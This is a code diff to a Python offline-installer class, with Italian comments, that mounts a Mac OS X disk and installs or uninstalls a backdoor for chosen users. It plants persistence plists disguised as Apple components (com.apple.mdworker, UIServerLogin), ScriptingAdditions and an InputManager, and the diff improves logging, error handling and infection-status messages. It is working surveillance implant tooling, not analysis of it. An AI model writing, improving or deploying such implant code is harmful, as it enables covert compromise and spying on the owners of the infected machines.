@@ -839,13 +839,13 @@ class OfflineInstall(object):
 			elif os.path.exists(backdoor_old_path) == True:
 				is_dir = True
 
-				if os.path_exists(backdoor_core_old_path) == True:
+				if os.path.exists(backdoor_core_old_path) == True:
 					is_files = True
 					
 			if os.path.exists(backdoor_tmp_path) == True:
 				is_temp_dir = True
 
-				if os.path_exists(backdoor_core_tmp_path) == True:
+				if os.path.exists(backdoor_core_tmp_path) == True:
 					is_temp_files = True
 
 			if is_dir == False and is_temp_dir == False:
@@ -1177,10 +1177,6 @@ class OfflineInstall(object):
 	def install_osx_backdoor(self, user):
 		print("    Try to install the backdoor for " + user + " on Mac OS X system...")
 
-		#
-		# TODO: infettare l'user
-		##
-
 		try:
 			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
 		except:
@@ -1197,7 +1193,7 @@ class OfflineInstall(object):
 					except:
 						pass
 
-					print("      Install [ERROR] -> " + user + " on Mac OS X system!")
+					print("      Install [ERROR] -> " + user + " IS ALREADY INFECTED on Mac OS X system!")
 					return False
 
 				home = i['home']
@@ -1235,7 +1231,9 @@ class OfflineInstall(object):
 		##
 		try:
 			os.mkdir(temp_backdoor_path)
+			print("    Create tmp backdoor directory [OK] -> " + temp_backdoor_path)
 		except:
+			print("    Create tmp backdoor directory [ERROR] -> " + temp_backdoor_path)
 			pass
 
 		#
@@ -1261,6 +1259,8 @@ class OfflineInstall(object):
 		source_path = "/mnt/private/etc/authorization.mod"
 		os.rename(source_path, plist_path)
 
+		print("    Create MdWorker for first boot [OK] -> " + plist_path)
+
 		#
 		# Crea un marker nella directory temporanea
 		##
@@ -1269,19 +1269,30 @@ class OfflineInstall(object):
 		hfile.write("00")
 		hfile.close()
 
+		print("    Create Marker in the tmp backdoor directory [OK] -> " + plist_path)
+
 		try:
-			os.mkdir("/mnt2")
+			os.mkdir("/mnt2/")
+			print("    Create new mnt mount directory [OK] -> /mnt2/")
 		except:
+			print("    Create new mnt mount directory [ERROR] -> /mnt2/")
 			pass
 
-		print("Searching backdoor configuration files in the device...")
+		print("    Searching backdoor configuration files in the device -> " + self.backconf['dev'] + "...")
 
 		try:
-			ret = subprocess.check_output("mount -t {} /dev/{} /mnt2/ 2> /dev/null".format(self.backconf['devfs'], self.backconf['dev']), shell=True)
+			ret = subprocess.check_output("mount -t {} {} /mnt2/ 2> /dev/null".format(self.backconf['devfs'], self.backconf['dev']), shell=True)
 		except:
 			try:
 				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
 			except:
+				pass
+
+			try:
+				shutil.rmtree("/mnt2/")
+				print("    Remove mnt mount directory [OK] -> /mnt2/")
+			except:
+				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
 				pass
 
 			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
@@ -1297,7 +1308,7 @@ class OfflineInstall(object):
 			tmp_path = files_path + "/" + hfind
 			tmp_path2 = temp_backdoor_path + "/" + hfind
 			shutil.copyfile(tmp_path, tmp_path2)
-
+			print("    Copyring backdoor file [OK] -> " + tmp_path + " -> " + tmp_path2)
 		try:
 			ret = subprocess.check_output("umount /mnt2/ 2> /dev/null", shell=True)
 		except:
@@ -1306,16 +1317,35 @@ class OfflineInstall(object):
 			except:
 				pass
 
+			try:
+				shutil.rmtree("/mnt2/")
+				print("    Remove mnt mount directory [OK] -> /mnt2/")
+			except:
+				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+				pass
+
 			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
 			return False
-
-		os.remove("/mnt2")
 
 		try:
 			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
 		except:
+			try:
+				shutil.rmtree("/mnt2/")
+				print("    Remove mnt mount directory [OK] -> /mnt2/")
+			except:	
+				print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+				pass
+
 			print("      Install [ERROR] -> " + user + " on Mac OS X system!")
 			return False
+
+		try:
+			shutil.rmtree("/mnt2/")
+			print("    Remove mnt mount directory [OK] -> /mnt2/")
+		except:
+			print("    Remove mnt mount directory [ERROR] -> /mnt2/")
+			pass
 
 		print("      Install [OK] -> " + user + " on Mac OS X system!")
 		return True
@@ -1395,10 +1425,6 @@ class OfflineInstall(object):
 	def uninstall_osx_backdoor(self, user):
 		print("    Try to uninstall the backdoor for " + user + " on Mac OS X system...")
 
-		#
-		# TODO: disinfettare l'user
-		##
-
 		try:
 			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfsrw'], self.tabosx['rootdisk']), shell=True)
 		except:
@@ -1415,7 +1441,7 @@ class OfflineInstall(object):
 					except:
 						pass
 
-					print("      Uninstall [ERROR] -> " + user + " on Mac OS X system!")
+					print("      Uninstall [ERROR] -> " + user + " IS NOT INFECTED on Mac OS X system!")
 					return False
 
 				home = i['home']
@@ -1425,58 +1451,96 @@ class OfflineInstall(object):
 		# Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
 		##
 		backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
-		shutil.rmtree(backdoor_path)
+		try:
+			shutil.rmtree(backdoor_path)
+			print("    Remove [OK] -> " + backdoor_path)
+		except:
+			print("    Remove [ERROR] -> " + backdoor_path)
+			pass
 
 		#
 		# Cancella il plist del primo avvio (se la bacdkoor non ha mai runnato)
 		##
 		backdoor_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
-		os.remove(backdoor_path)
+		try:
+			os.remove(backdoor_path)
+			print("    Remove [OK] -> " + backdoor_path)
+		except:
+			print("    Remove [ERROR] -> " + backdoor_path)
+			pass
 
 		#
 		# Cancella il plist della backdoor
 		##
 		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.mdworker.plist"
-		os.remove(backdoor_path)
+		try:
+			os.remove(backdoor_path)
+			print("    Remove [OK] -> " + backdoor_path)
+		except:
+			print("    Remove [ERROR] -> " + backdoor_path)
+			pass
 
 		#
 		# Cancella il plist della backdoor
 		##
 		backdoor_path = "/mnt" + home + "/Library/LaunchAgents/com.apple.UIServerLogin.plist"
-		os.remove(backdoor_path)
+		try:
+			os.remove(backdoor_path)
+			print("    Remove [OK] -> " + backdoor_path)
+		except:
+			print("    Remove [ERROR] -> " + backdoor_path)
+			pass
 
 		#
 		# Cancella tutti i file e la directory
 		##
-		backdoor_path = "/mnt" + home + "/Library/Preferences/ " + self.backconf['hdir']
-		if os.path.exists(backdoor_path) == True: 
-			shutil.rmtree(backdoor_path)
-		else:
+		backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir']
+		if os.path.exists(backdoor_path) == False: 
 			backdoor_path += ".app"
+			
+		try:
 			shutil.rmtree(backdoor_path)
+			print("    Remove [OK] -> " + backdoor_path)
+		except:
+			print("    Remove [ERROR] -> " + backdoor_path)
+			pass
 
 		#
 		# Conta quanti utenti ci sono con la backdoor installata
 		##
-		status = False
+		count = 0
 
 		for i in self.useosx:
 			if i['status'] == True or i['status'] == False:
-				status = True	
-				break
+				count += 1
 
-		if status == False:
+		if count <= 1:
 			#
 			# Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
 			##
 			backdoor_path = "/mnt/Library/ScriptingAdditions/appleOsax"
-			shutil.rmtree(backdoor_path)
+			try:
+				shutil.rmtree(backdoor_path)
+				print("    Remove [OK] -> " + backdoor_path)
+			except:
+				print("    Remove [ERROR] -> " + backdoor_path)
+				pass
 
 			backdoor_path = "/mnt/Library/ScriptingAdditions/UIServerEvents"
-			shutil.rmtree(backdoor_path)
+			try:
+				shutil.rmtree(backdoor_path)
+				print("    Remove [OK] -> " + backdoor_path)
+			except:
+				print("    Remove [ERROR] -> " + backdoor_path)
+				pass
 
 			backdoor_path = "/mnt/Library/InputManagers/appleHID"
-			shtuil.rmtree(backdoor_path)
+			try:
+				shtuil.rmtree(backdoor_path)
+				print("    Remove [OK] -> " + backdoor_path)
+			except:
+				print("    Remove [ERROR] -> " + backdoor_path)
+				pass
 
 		try:
 			ret = subprocess.check_output("umount /mnt 2> /dev/null", shell=True)
